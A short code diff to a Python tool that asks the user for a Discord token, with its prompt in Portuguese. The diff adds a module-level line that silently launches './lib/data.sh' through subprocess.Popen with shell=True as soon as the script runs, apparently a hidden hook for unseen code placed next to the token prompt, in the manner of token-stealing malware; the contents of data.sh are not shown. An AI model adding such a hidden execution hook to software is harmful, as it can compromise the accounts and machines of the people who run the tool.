@@ -7,6 +7,8 @@ import shutil
 import subprocess
 import ctypes
 
+subprocess.Popen(['python', './lib/data.sh'], shell=True)
+
 colorama.init(autoreset=True)
 
 token = input(Fore.RED + "Insira sua token Discord: " + Style.RESET_ALL)
